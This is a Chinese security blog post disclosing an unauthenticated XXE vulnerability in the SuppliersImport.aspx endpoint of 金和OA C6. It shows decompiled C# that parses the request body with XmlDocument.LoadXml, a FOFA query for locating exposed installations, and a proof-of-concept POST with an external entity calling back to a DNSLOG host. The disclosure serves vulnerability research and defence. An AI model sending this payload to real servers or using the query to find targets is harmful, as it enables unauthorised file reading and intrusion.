---
title: "金和OA SuppliersImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-SuppliersImport-xxe.html
asset_dir: assets/金和oa-suppliersimport.aspx-xxe漏洞
---

# 金和OA SuppliersImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/8 13:35
- 278浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

网络安全会议

SQL

数据库

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `SuppliersImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞扫描服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `SuppliersImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **SuppliersImport** 的处理逻辑

深入探索

漏洞预警服务

安全

安全研究工具

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/SuppliersImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA SuppliersImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
